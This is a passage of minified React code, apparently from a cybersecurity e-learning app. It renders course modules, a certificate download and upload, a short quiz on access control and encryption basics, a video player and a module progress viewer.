mx-auto space-y-8",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Training ",e.jsx("span",{className:"text-[#00FF88]",children:"Modules"})]}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:"ACQUIRE NEW CAPABILITIES"})]}),e.jsx("div",{className:"h-10 w-10 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center",children:e.jsx(xr,{className:"h-5 w-5 text-[#00FF88]"})})]}),!f&&e.jsxs("div",{className:"bg-[#0A0F0A] border border-yellow-500/20 rounded-xl p-6 relative overflow-hidden group",children:[e.jsx("div",{className:"absolute inset-0 bg-yellow-500/5 group-hover:bg-yellow-500/10 transition-colors"}),e.jsxs("div",{className:"relative flex items-center space-x-4",children:[e.jsx("div",{className:"h-12 w-12 rounded-full bg-yellow-500/10 flex items-center justify-center border border-yellow-500/20",children:e.jsx(vt,{className:"h-6 w-6 text-yellow-500"})}),e.jsxs("div",{children:[e.jsx("h3",{className:"font-bold text-yellow-500 uppercase tracking-wider",children:"Access Restricted"}),e.jsx("p",{className:"text-yellow-500/80 text-sm mt-1",children:"Complete the initial assessment to unlock classified training modules."})]})]})]}),e.jsx("div",{className:"grid gap-6",children:o?e.jsx("div",{className:"text-center text-[#00B37A] font-mono animate-pulse",children:"INITIALIZING TRAINING DATA..."}):s.map(x=>{const p=f,b=x.progress??0;return e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden group hover:border-[#00FF88]/30 transition-all duration-300 relative",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-[#00FF88]/0 via-[#00FF88]/0 to-[#00FF88]/0 group-hover:via-[#00FF88]/5 transition-all duration-500"}),e.jsxs("div",{className:"p-6 relative",children:[e.jsxs("div",{className:"flex items-start justify-between mb-6",children:[e.jsxs("div",{className:"flex-1",children:[e.jsxs("div",{className:"flex items-center space-x-3 mb-2",children:[e.jsx("h2",{className:"text-2xl font-bold text-white tracking-tight",children:x.title}),p?e.jsx("div",{className:"px-2 py-0.5 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 text-[#00FF88] text-[10px] font-bold uppercase tracking-wider",children:"Unlocked"}):e.jsx("div",{className:"px-2 py-0.5 rounded bg-red-500/10 border border-red-500/20 text-red-500 text-[10px] font-bold uppercase tracking-wider",children:"Locked"})]}),e.jsx("p",{className:"text-[#00B37A] mb-6 max-w-2xl",children:x.description}),e.jsxs("div",{className:"flex items-center space-x-6 text-sm text-[#EAEAEA]/60 font-mono",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(He,{className:"h-4 w-4 text-[#00FF88]"}),e.jsxs("span",{children:[(x.modules??x.course_modules??[]).length," MODULES"]})]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(Pt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsxs("span",{children:["~",(x.modules??x.course_modules??[]).length*2," HOURS"]})]})]})]}),e.jsxs("button",{onClick:()=>p&&a(x.id),disabled:!p,className:`flex items-center space-x-2 px-6 py-3 rounded-lg font-bold transition-all duration-300 ${p?"bg-[#00FF88] text-black hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)]":"bg-[#0A0F0A] border border-white/10 text-white/20 cursor-not-allowed"}`,children:[p?e.jsx(Bt,{className:"h-4 w-4 fill-current"}):e.jsx(vt,{className:"h-4 w-4"}),e.jsx("span",{children:p?"START MISSION":"LOCKED"})]})]}),p&&e.jsxs("div",{className:"mb-6",children:[e.jsxs("div",{className:"flex justify-between text-xs text-[#00B37A] mb-2 font-mono uppercase tracking-wider",children:[e.jsx("span",{children:"Mission Progress"}),e.jsxs("span",{children:[b,"%"]})]}),e.jsx("div",{className:"w-full bg-black rounded-full h-1.5 border border-[#00FF88]/10",children:e.jsx("div",{className:"bg-[#00FF88] h-full rounded-full transition-all duration-500 shadow-[0_0_10px_rgba(0,255,136,0.5)]",style:{width:`${b}%`}})})]}),e.jsxs("div",{className:"border-t border-[#00FF88]/10 pt-6",children:[e.jsx("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-4",children:"Module Breakdown"}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-3",children:[(x.modules??x.course_modules??[]).slice(0,6).map((w,j)=>{const N=j<m&&f||n?.role==="admin";return e.jsxs("div",{className:"flex items-center space-x-3 text-sm group/module",children:[N?w.completed?e.jsx(Pe,{className:"h-4 w-4 text-[#00FF88]"}):e.jsx("div",{className:"h-4 w-4 rounded-full border border-[#00FF88]/30 group-hover/module:border-[#00FF88] transition-colors"}):e.jsx(vt,{className:"h-4 w-4 text-white/20"}),e.jsxs("span",{className:`${N?"text-[#EAEAEA] group-hover/module:text-[#00FF88]":"text-white/20"} transition-colors`,children:[e.jsxs("span",{className:"font-mono text-[#00B37A] mr-2",children:["0",j+1]}),w.title.split("  ")[1]||w.title]})]},w.id)}),x.modules&&x.modules.length>6&&e.jsxs("div",{className:"text-xs text-[#00B37A] font-mono col-span-2 mt-2",children:["+",x.modules.length-6," ADDITIONAL MODULES CLASSIFIED..."]})]})]})]})]},x.id)})})]})})},Xj=({isOpen:a,onClose:n,courseName:s,studentName:i,completionDate:o})=>{const c=v.useRef(null),{user:d,updateUser:m}=Ie();if(!a)return null;const f=async()=>{if(!c.current)return;const p=(await pr(async()=>{const{default:F}=await import("./html2canvas.esm-DXEQVQnt.js");return{default:F}},[])).default,b=await p(c.current),w=await new Promise(F=>b.toBlob(T=>F(T),"image/png"));if(!w){console.error("Failed to generate certificate blob");return}const j=d?.id??null;if(!j)console.warn("No authenticated user in context; certificate will not be saved to DB.");else{const T=s.replace(/\s+/g,"_").replace(/[^a-zA-Z0-9_-]/g,""),S=`certificates/${`${j}_${T}_${Date.now()}.png`}`;try{const{error:U}=await Z.storage.from("certificates").upload(S,w,{contentType:"image/png"});if(U)console.error("Failed to upload certificate to storage:",U.message??U);else{const{data:z}=Z.storage.from("certificates").getPublicUrl(S),H=z?.publicUrl??"";try{const{data:G,error:O}=await Z.from("users").select("certificates").eq("id",j).maybeSingle();O&&console.warn("Failed to fetch user row to append certificate:",O.message??O);const V=G?.certificates??[],B=Array.isArray(V)?[...V,H]:[H],{error:ae}=await Z.from("users").update({certificates:B}).eq("id",j);if(ae)console.error("Failed to update user certificates array:",ae.message??ae);else if(m){const xe={certificates:B};try{m(xe)}catch(ye){console.warn("updateUser call failed:",ye.message??ye)}}}catch(G){console.error("Failed to append certificate to user row:",G.message??G)}}}catch(U){console.error("Failed to save/upload certificate:",U.message??U)}}const N=URL.createObjectURL(w),k=document.createElement("a");k.download=`${s.replace(/\s+/g,"_")}_Certificate.png`,k.href=N,k.click(),setTimeout(()=>URL.revokeObjectURL(N),5e3)},x=o.toLocaleDateString("en-US",{year:"numeric",month:"long",day:"numeric"});return e.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50",children:e.jsxs("div",{className:"bg-card rounded-lg shadow-xl max-w-4xl w-full",children:[e.jsx("div",{className:"p-6",children:e.jsx("div",{ref:c,className:"p-12 rounded-lg code-bg border-8 border-double border-slate-700",children:e.jsxs("div",{className:"text-center",children:[e.jsx(tt,{className:"h-16 w-16 text-accent mx-auto mb-6"}),e.jsx("h2",{className:"text-3xl font-bold text-primary mb-2",children:"Certificate of Completion"}),e.jsx("p",{className:"text-muted mb-8",children:"This is to certify that"}),e.jsx("p",{className:"text-2xl font-bold text-accent mb-6",children:i}),e.jsx("p",{className:"text-muted mb-4",children:"has successfully completed the course"}),e.jsx("p",{className:"text-2xl font-bold text-primary mb-8",children:s}),e.jsxs("p",{className:"text-muted mb-8",children:["on ",x]}),e.jsx("div",{className:"max-w-xs mx-auto border-t-2 border-slate-700 pt-4",children:e.jsx("p",{className:"text-muted text-sm",children:"Course Instructor Signature"})})]})})}),e.jsxs("div",{className:"bg-card px-6 py-4 rounded-b-lg flex justify-end space-x-4",children:[e.jsx("button",{onClick:n,className:"px-4 py-2 text-muted hover:text-primary transition-colors",children:"Close"}),e.jsxs("button",{onClick:f,className:"btn-primary px-6 py-2 rounded-lg transition-colors flex items-center space-x-2",children:[e.jsx(Us,{className:"h-4 w-4"}),e.jsx("span",{children:"Download Certificate"})]})]})]})})},Zj=a=>{const n={"module-1":[{question:"What is the principle of least privilege?",options:["Giving users maximum access to reduce support tickets","Giving users only the minimum access necessary for their role","Removing all user privileges by default","Sharing privileges among team members"],correctAnswer:1,explanation:"The principle of least privilege means providing users with only the minimum access necessary to perform their job functions."},{question:"Which of the following is an example of broken access control?",options:["Strong password requirements","Multi-factor authentication","Direct object reference without authorization checks","Session timeouts"],correctAnswer:2,explanation:"Direct object references without proper authorization checks allow users to access resources they should not have access to."},{question:"How can horizontal privilege escalation be prevented?",options:["Implementing proper session management","Using strong encryption","Validating user authorization for each resource access","Regular password changes"],correctAnswer:2,explanation:"Validating user authorization for each resource access ensures users can only access their own data."},{question:"What is vertical privilege escalation?",options:["Accessing data of users at the same privilege level","Gaining higher-level privileges than intended","Reducing user privileges","Sharing privileges horizontally"],correctAnswer:1,explanation:"Vertical privilege escalation occurs when a user gains access to higher-level privileges than they should have."},{question:"Which HTTP method should require proper authorization checks?",options:["Only POST requests","Only GET requests","Only PUT and DELETE requests","All HTTP methods"],correctAnswer:3,explanation:"All HTTP methods should have proper authorization checks, not just state-changing methods."}],"module-2":[{question:"Which encryption algorithm is considered secure for current use?",options:["DES","MD5","AES-256","SHA-1"],correctAnswer:2,explanation:"AES-256 is currently considered secure for encryption purposes."},{question:"What is the main purpose of TLS?",options:["Data compression","Secure communication over networks","User authentication only","Database encryption"],correctAnswer:1,explanation:"TLS (Transport Layer Security) provides secure communication over networks."}]};return n[a]||n["module-1"]},e2=({moduleId:a,moduleTitle:n,onComplete:s,onBack:i})=>{const[o,c]=v.useState(0),[d,m]=v.useState([]),[f,x]=v.useState(null),[p,b]=v.useState(!1),[w,j]=v.useState(600),N=Zj(a),k=N[o];gd.useEffect(()=>{if(w>0&&!p){const z=setTimeout(()=>j(w-1),1e3);return()=>clearTimeout(z)}else w===0&&R()},[w,p]);const F=z=>{x(z)},T=()=>{if(f!==null){const z=[...d];z[o]=f,m(z),o<N.length-1?(c(o+1),x(z[o+1]??null)):R()}},R=()=>{b(!0)},S=z=>{let H=0;return N.forEach((G,O)=>{z[O]===G.correctAnswer&&H++}),Math.round(H/N.length*100)},U=z=>{const H=Math.floor(z/60),G=z%60;return`${H}:${G.toString().padStart(2,"0")}`};if(p){const z=S(d),H=z>=70;return e.jsx("div",{className:"p-6",children:e.jsxs("div",{className:"max-w-4xl mx-auto",children:[e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-8 text-center",children:[e.jsx("div",{className:"mb-6",children:H?e.jsx(Pe,{className:"h-16 w-16 text-green-500 mx-auto"}):e.jsx(bs,{className:"h-16 w-16 text-red-500 mx-auto"})}),e.jsx("h2",{className:"text-2xl font-bold text-gray-900 mb-4",children:"Test Complete!"}),e.jsxs("div",{className:"text-4xl font-bold text-cyan-600 mb-2",children:[z,"%"]}),e.jsx("p",{className:"text-lg text-gray-600 mb-6",children:H?"Congratulations! You passed the test.":"You need 70% to pass. Try again!"}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6 mb-8",children:[e.jsxs("div",{className:"bg-gray-50 p-4 rounded-lg",children:[e.jsx("div",{className:"text-xl font-bold text-gray-900",children:d.filter((G,O)=>G===N[O]?.correctAnswer).length}),e.jsx("div",{className:"text-gray-600",children:"Correct"})]}),e.jsxs("div",{className:"bg-gray-50 p-4 rounded-lg",children:[e.jsx("div",{className:"text-xl font-bold text-gray-900",children:N.length-d.filter((G,O)=>G===N[O]?.correctAnswer).length}),e.jsx("div",{className:"text-gray-600",children:"Incorrect"})]})]}),e.jsxs("div",{className:"flex justify-center space-x-4",children:[e.jsx("button",{onClick:()=>s(z),disabled:!H,className:`px-6 py-3 rounded-lg font-medium ${H?"bg-green-600 text-white hover:bg-green-700":"bg-gray-300 text-gray-500 cursor-not-allowed"}`,children:H?"Complete Module":"Retake Required"}),e.jsx("button",{onClick:i,className:"px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors",children:"Back to Module"})]})]}),e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-6 mt-6",children:[e.jsx("h3",{className:"text-xl font-bold text-gray-900 mb-6",children:"Detailed Results"}),e.jsx("div",{className:"space-y-4",children:N.map((G,O)=>{const V=d[O],B=V===G.correctAnswer;return e.jsx("div",{className:`border rounded-lg p-4 ${B?"border-green-200 bg-green-50":"border-red-200 bg-red-50"}`,children:e.jsxs("div",{className:"flex items-start space-x-3",children:[B?e.jsx(Pe,{className:"h-5 w-5 text-green-500 mt-0.5"}):e.jsx(bs,{className:"h-5 w-5 text-red-500 mt-0.5"}),e.jsxs("div",{className:"flex-1",children:[e.jsx("p",{className:"font-medium text-gray-900 mb-2",children:G.question}),e.jsxs("p",{className:"text-sm text-gray-600 mb-2",children:[e.jsx("span",{className:"font-medium",children:"Your answer:"})," ",G.options[V]]}),!B&&e.jsxs("p",{className:"text-sm text-gray-600 mb-2",children:[e.jsx("span",{className:"font-medium",children:"Correct answer:"})," ",G.options[G.correctAnswer]]}),e.jsx("p",{className:"text-sm text-gray-700",children:G.explanation})]})]})},O)})})]})]})})}return e.jsx("div",{className:"p-6",children:e.jsxs("div",{className:"max-w-4xl mx-auto",children:[e.jsxs("div",{className:"flex items-center justify-between mb-6",children:[e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsxs("button",{onClick:i,className:"flex items-center space-x-2 text-gray-600 hover:text-gray-900 transition-colors",children:[e.jsx(ys,{className:"h-5 w-5"}),e.jsx("span",{children:"Back"})]}),e.jsxs("h1",{className:"text-xl font-bold text-gray-900",children:[n," - Test"]})]}),e.jsxs("div",{className:"flex items-center space-x-2 text-lg font-medium",children:[e.jsx(Pt,{className:"h-5 w-5 text-gray-500"}),e.jsx("span",{className:w<120?"text-red-600":"text-gray-900",children:U(w)})]})]}),e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-6 mb-6",children:[e.jsxs("div",{className:"flex justify-between items-center mb-2",children:[e.jsxs("span",{className:"text-sm text-gray-600",children:["Question ",o+1," of ",N.length]}),e.jsxs("span",{className:"text-sm text-gray-600",children:[Math.round((o+1)/N.length*100),"% Complete"]})]}),e.jsx("div",{className:"w-full bg-gray-200 rounded-full h-2",children:e.jsx("div",{className:"bg-cyan-600 h-2 rounded-full transition-all duration-300",style:{width:`${(o+1)/N.length*100}%`}})})]}),e.jsxs("div",{className:"bg-white rounded-lg shadow-md p-8",children:[e.jsx("h2",{className:"text-xl font-bold text-gray-900 mb-6",children:k.question}),e.jsx("div",{className:"space-y-3 mb-8",children:k.options.map((z,H)=>e.jsx("button",{onClick:()=>F(H),className:`w-full text-left p-4 rounded-lg border-2 transition-all ${f===H?"border-cyan-500 bg-cyan-50 text-cyan-900":"border-gray-200 hover:border-gray-300 bg-white"}`,children:e.jsxs("div",{className:"flex items-center space-x-3",children:[e.jsx("div",{className:`w-4 h-4 rounded-full border-2 ${f===H?"border-cyan-500 bg-cyan-500":"border-gray-300"}`,children:f===H&&e.jsx("div",{className:"w-full h-full rounded-full bg-white scale-50"})}),e.jsx("span",{className:"text-gray-900",children:z})]})},H))}),e.jsxs("div",{className:"flex justify-between",children:[e.jsx("button",{onClick:()=>{o>0&&(c(o-1),x(d[o-1]??null))},disabled:o===0,className:"px-6 py-2 border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed transition-colors",children:"Previous"}),e.jsx("button",{onClick:o===N.length-1?R:T,disabled:f===null,className:"px-6 py-2 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors",children:o===N.length-1?"Submit Test":"Next Question"})]})]})]})})},t2=a=>a.includes("youtube.com/watch?v=")?`https://www.youtube.com/embed/${a.split("v=")[1]?.split("&")[0]}`:a.includes("youtu.be/")?`https://www.youtube.com/embed/${a.split("youtu.be/")[1]?.split("?")[0]}`:a,r2=a=>a.includes("youtube.com")||a.includes("youtu.be"),Bd=({videoUrl:a,title:n,isLive:s=!1,onProgress:i,onComplete:o})=>{const[c,d]=v.useState(!1),[m,f]=v.useState(0),[x,p]=v.useState(0),[b,w]=v.useState(1),[j,N]=v.useState(!1),[k,F]=v.useState(!1),[T,R]=v.useState(!0),[S,U]=v.useState(1),z=v.useRef(null),H=v.useRef(null),G=v.useRef(),O=r2(a),V=O?t2(a):a;v.useEffect(()=>{if(O)return;const W=z.current;if(!W)return;const Q=()=>{f(W.currentTime),i&&i(W.currentTime/W.duration*100)},E=()=>{p(W.duration)},I=()=>{d(!1),o&&o()};return W.addEventListener("timeupdate",Q),W.addEventListener("loadedmetadata",E),W.addEventListener("ended",I),()=>{W.removeEventListener("timeupdate",Q),W.removeEventListener("loadedmetadata",E),W.removeEventListener("ended",I)}},[i,o,O]);const B=()=>{if(O)return;const W=z.current;W&&(c?W.pause():W.play(),d(!c))},ae=W=>{if(O)return;const Q=z.current;if(!Q)return;const E=W.currentTarget.getBoundingClientRect(),P=(W.clientX-E.left)/E.width*x;Q.currentTime=P,f(P)},xe=()=>{if(O)return;const W=z.current;W&&(W.muted=!j,N(!j))},ye=W=>{if(O)return;const Q=z.current;if(!Q)return;const E=parseFloat(W.target.value);Q.volume=E,w(E),N(E===0)},ne=()=>{const W=H.current;W&&(k?document.exitFullscreen():W.requestFullscreen(),F(!k))},fe=W=>{if(O)return;const Q=z.current;Q&&(Q.currentTime=Math.max(0,Math.min(x,Q.currentTime+W)))},ie=W=>{if(O)return;const Q=z.current;Q&&(Q.playbackRate=W,U(W))},ee=W=>{const Q=Math.floor(W/60),E=Math.floor(W%60);return`${Q}:${E.toString().padStart(2,"0")}`},M=()=>{O||(R(!0),G.current&&clearTimeout(G.current),G.current=setTimeout(()=>{c&&R(!1)},3e3))};return e.jsxs("div",{ref:H,className:"relative bg-black rounded-lg overflow-hidden group aspect-video min-h-[360px]",onMouseMove:M,onMouseLeave:()=>c&&R(!1),children:[s&&e.jsxs("div",{className:"absolute top-4 left-4 z-20 bg-red-600 text-white px-3 py-1 rounded-full text-sm font-medium flex items-center space-x-2",children:[e.jsx("div",{className:"w-2 h-2 bg-white rounded-full animate-pulse"}),e.jsx("span",{children:"LIVE"})]}),O?e.jsx("iframe",{className:"w-full h-full",src:V,title:n,frameBorder:"0",allow:"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share",allowFullScreen:!0}):e.jsx("video",{ref:z,className:"w-full h-full",src:a,poster:"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjQ1MCIgdmlld0JveD0iMCAwIDgwMCA0NTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI4MDAiIGhlaWdodD0iNDUwIiBmaWxsPSIjMUYyOTM3Ii8+CjxjaXJjbGUgY3g9IjQwMCIgY3k9IjIyNSIgcj0iNDAiIGZpbGw9IiMwNkI2RDQiLz4KPHN2ZyB4PSIzODUiIHk9IjIxMCIgd2lkdGg9IjMwIiBoZWlnaHQ9IjMwIiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9IndoaXRlIj4KPHA+PHBhdGggZD0ibTcgNCA5IDUuNS05IDUuNVY0eiIvPjwvcGF0aD4KPC9zdmc+Cjx0ZXh0IHg9IjQwMCIgeT0iMzAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjOTRBM0I4IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiPkN5YmVyU2VjIFZpZGVvIExlY3R1cmU8L3RleHQ+Cjwvc3ZnPgo=",onClick:B}),!O&&e.jsxs("div",{className:`absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent transition-opacity duration-300 ${T?"opacity-100":"opacity-0"}`,children:[e.jsx("div",{className:"absolute inset-0 flex items-center justify-center",children:e.jsx("button",{onClick:B,className:"bg-black/50 hover:bg-black/70 text-white p-4 rounded-full transition-all duration-200 transform hover:scale-110",children:c?e.jsx(Am,{className:"h-8 w-8"}):e.jsx(Bt,{className:"h-8 w-8 ml-1"})})}),e.jsxs("div",{className:"absolute bottom-0 left-0 right-0 p-4",children:[e.jsx("div",{className:"mb-4",children:e.jsx("div",{className:"w-full h-2 bg-white/30 rounded-full cursor-pointer hover:h-3 transition-all",onClick:ae,children:e.jsx("div",{className:"h-full bg-orange-500 rounded-full relative",style:{width:`${m/x*100}%`},children:e.jsx("div",{className:"absolute right-0 top-1/2 transform translate-x-1/2 -translate-y-1/2 w-4 h-4 bg-orange-500 rounded-full opacity-0 hover:opacity-100 transition-opacity"})})})}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsx("button",{onClick:B,className:"text-white hover:text-orange-400 transition-colors",children:c?e.jsx(Am,{className:"h-6 w-6"}):e.jsx(Bt,{className:"h-6 w-6"})}),e.jsx("button",{onClick:()=>fe(-10),className:"text-white hover:text-orange-400 transition-colors",children:e.jsx(fy,{className:"h-5 w-5"})}),e.jsx("button",{onClick:()=>fe(10),className:"text-white hover:text-orange-400 transition-colors",children:e.jsx(my,{className:"h-5 w-5"})}),e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx("button",{onClick:xe,className:"text-white hover:text-orange-400 transition-colors",children:j||b===0?e.jsx(xy,{className:"h-5 w-5"}):e.jsx(C0,{className:"h-5 w-5"})}),e.jsx("input",{type:"range",min:"0",max:"1",step:"0.1",value:j?0:b,onChange:ye,className:"w-20 h-1 bg-white/30 rounded-full appearance-none cursor-pointer"})]}),e.jsxs("div",{className:"text-white text-sm",children:[ee(m)," / ",ee(x)]})]}),e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsxs("div",{className:"relative group",children:[e.jsxs("button",{className:"text-white hover:text-orange-400 transition-colors flex items-center space-x-1",children:[e.jsx(Sd,{className:"h-5 w-5"}),e.jsxs("span",{className:"text-sm",children:[S,"x"]})]}),e.jsx("div",{className:"absolute bottom-full right-0 mb-2 bg-black/90 rounded-lg p-2 opacity-0 group-hover:opacity-100 transition-opacity",children:[.5,.75,1,1.25,1.5,2].map(W=>e.jsxs("button",{onClick:()=>ie(W),className:`block w-full text-left px-3 py-1 text-sm rounded hover:bg-white/20 transition-colors ${S===W?"text-orange-400":"text-white"}`,children:[W,"x"]},W))})]}),e.jsx("button",{onClick:ne,className:"text-white hover:text-orange-400 transition-colors",children:e.jsx(iy,{className:"h-5 w-5"})})]})]})]})]}),e.jsx("div",{className:`absolute top-4 left-4 right-4 transition-opacity duration-300 ${T||O?"opacity-100":"opacity-0"}`,children:e.jsx("h3",{className:"text-white text-lg font-medium",children:n})})]})},s2=({courseId:a,moduleId:n,onBack:s,onNavigateToModule:i,onModuleStatusChange:o})=>{const[c,d]=v.useState("content"),[m,f]=v.useState(!1),{user:x}=Ie(),[p,b]=v.useState(!1),[w,j]=v.useState(null),[N,k]=v.useState(!1);v.useEffect(()=>{let O=!0;return(async()=>{k(!0);try{const B=await lt.getCourseById(a);O&&j(B)}catch(B){console.error("Failed to load course for module viewer:",B)}finally{O&&k(!1)}})(),()=>{O=!1}},[a]);const F=(w?.course_modules??w?.modules??[]).find(O=>O.id===n),T=O=>(O.course_modules??O.modules??[]).every(B=>B.completed);if(N)return e.jsx("div",{className:"p-6 min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center",children:e.jsxs("div",{className:"text-center",children:[e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#00FF88] mx-auto mb-4"}),e.jsx("p",{className:"text-[#00FF88] font-mono",children:"LOADING MODULE DATA..."})]})});if(!w||!F)return e.jsx("div",{className:"p-6 min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center",children:e.jsxs("div",{className:"text-center",children:[e.jsx(He,{className:"h-16 w-16 text-red-500 mx-auto mb-4"}),e.jsx("p",{className:"text-red-400 font-mono",children:"ERROR: MODULE NOT FOUND"}),e.jsx("button",{onClick:s,className:"mt-4 text-[#00FF88] hover:underline",children:"Return to Course"})]})});const R=w.course_modules??w.modules??[],S=R.findIndex(O=>O.id===n),U=()=>{if(S>=0&&S<R.length-1){const O=R[S+1];if(i){i(O.id);return}window.history.pushState({},"",`/course/${a}?module=${O.id}`);const V=new CustomEvent("navigateModule",{detail:{moduleId:O.id}});window.dispatchEvent(V)}},z=async(O=!1)=>{try{F.completed=!0,j({...w}),x?.id&&(await Z.from("user_progress").upsert([{user_id:x.id,course_id:a,module_id:n,completed:!0,quiz_score:F.testScore??null,source:O?"manual":"test"}]),await pd.rebalance(x.id,a),o&&o())}catch(V){console.error("Failed to mark module completed:",V)}},H=async()=>{try{if(x?.id){const O=R.map(V=>({user_id:x.id,course_id:a,module_id:V.id,completed:!0,quiz_score:V.testScore??null,source:"manual-course-complete"}));await Z.from("user_progress").upsert(O),o&&await o(),b(!0)}else b(!0)}catch(O){console.error("Failed to complete course:",O)}},G=async O=>{F.completed=!0,F.testScore=O,f(!1);try{x?.id&&(await Z.from("user_progress").upsert([{user_id:x.id,course_id:a,module_id:n,completed:!0,quiz_score:O,source:"adaptive"}]),await pd.rebalance(x.id,a),o&&o())}catch(V){console.error("Failed to persist progress or rebalance:",V)}};return m?e.jsx(e2,{moduleId:n,moduleTitle:F.title,onComplete:G,onBack:()=>f(!1)}):e.jsx("div",{className:"p-6 min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-4xl mx-auto space-y-6",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("button",{onClick:s,className:"flex items-center space-x-2 text-[#00B37A] hover:text-[#00FF88] transition-colors group",children:[e.jsx(ys,{className:"h-5 w-5 group-hover:-translate-x-1 transition-transform"}),e.jsx("span",{className:"font-medium",children:"Back to Course"})]}),e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsx("button",{onClick:()=>z(!0),disabled:F.completed,className:`px-4 py-2 rounded-lg text-sm font-bold transition-all ${F.completed?"bg-[#00FF88]/10 text-[#00FF88] border border-[#00FF88]/20 cursor-not-allowed":"bg-[#00FF88] text-black hover:bg-[#00CC66] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)]"}`,title:"Mark this module as completed",children:F.completed?" Completed":"Mark Complete"}),e.jsxs("button",{onClick:U,disabled:S<0||S>=R.length-1,className:`px-4 py-2 rounded-lg text-sm font-bold transition-all flex items-center space-x-2 ${S<0||S>=R.length-1?"bg-white/5 border border-white/10 text-white/30 cursor-not-allowed":"bg-[#00B37A] text-black hover:bg-[#00FF88] hover:shadow-[0_0_20px_rgba(0,255,136,0.3)]"}`,title:"Go to next module",children:[e.jsx("span",{children:"Next Module"}),e.jsx(Bt,{className:"h-4 w-4"})]})]})]}),e.jsx("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden",children:e.jsxs("div",{className:"p-8",children:[e.jsxs("div",{className:"flex items-center space-x-3 mb-3",children:[e.jsx("div",{className:"p-2 rounded-lg bg-[#00FF88]/10 border border-[#00FF88]/20",children:e.jsx(He,{className:"h-6 w-6 text-[#00FF88]"})}),e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-white",children:F.title}),e.jsxs("p",{className:"text-[#00B37A] text-sm font-mono",children:["MODULE ",String(S+1).padStart(2,"0")," OF ",String(R.length).padStart(2,"0")]})]})]}),e.jsx("p",{className:"text-[#00B37A] mb-6",children:F.description}),e.jsxs("div",{className:"flex items-center flex-wrap gap-4 text-sm font-mono text-[#EAEAEA]/60",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(Pt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:"~2 HOURS"})]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(Mt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:"READING"})]}),F.videoUrl&&e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(Bt,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:"VIDEO"})]}),F.labUrl&&e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(Pn,{className:"h-4 w-4 text-[#00FF88]"}),e.jsx("span",{children:"HANDS-ON LAB"})]})]})]})}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 overflow-hidden",children:[e.jsx("div",{className:"border-b border-[#00FF88]/10",children:e.jsxs("nav",{className:"flex space-x-1 p-2",children:[e.jsx("button",{onClick:()=>d("content"),className:`py-3 px-6 rounded-lg font-medium text-sm transition-all ${c==="content"?"bg-[#00FF88] text-black":"text-[#00B37A] hover:text-[#00FF88] hover:bg-[#00FF88]/10"}`,children:e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(Mt,{className:"h-4 w-4"}),e.jsx("span",{children:"Content"})]})}),F.labUrl&&e.jsx("button",{onClick:()=>d("lab"),className:`py-3 px-6 rounded-lg font-medium text-sm transition-all ${c==="lab"?"bg-[#00FF88] text-black":"text-[#00B37A] hover:text-[#00FF88] hover:bg-[#00FF88]/10"}`,children:e.jsxs("div",{className:"flex items-center 